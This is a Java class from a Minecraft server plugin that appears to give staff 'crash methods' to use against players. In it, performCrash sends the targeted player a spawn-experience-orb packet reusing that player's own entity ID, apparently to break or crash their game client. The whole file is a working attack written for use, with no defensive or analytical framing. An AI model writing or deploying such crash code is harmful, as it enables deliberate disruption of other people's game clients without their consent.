package dev.xnlawa.staffhelper.crash.impl;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerSpawnExperienceOrb;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import org.bukkit.entity.Player;

public class DestroyPlayerACrash extends Crash {
    public DestroyPlayerACrash() {
        super(CrashMethod.DESTROYPLAYERA);
    }

    @Override
    public void performCrash(Player player) {
        WrapperPlayServerSpawnExperienceOrb packet = new WrapperPlayServerSpawnExperienceOrb(
                player.getEntityId(),
                player.getLocation().getX(),
                player.getLocation().getY(),
                player.getLocation().getZ(),
                (short)1
        );
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, packet);
    }
}
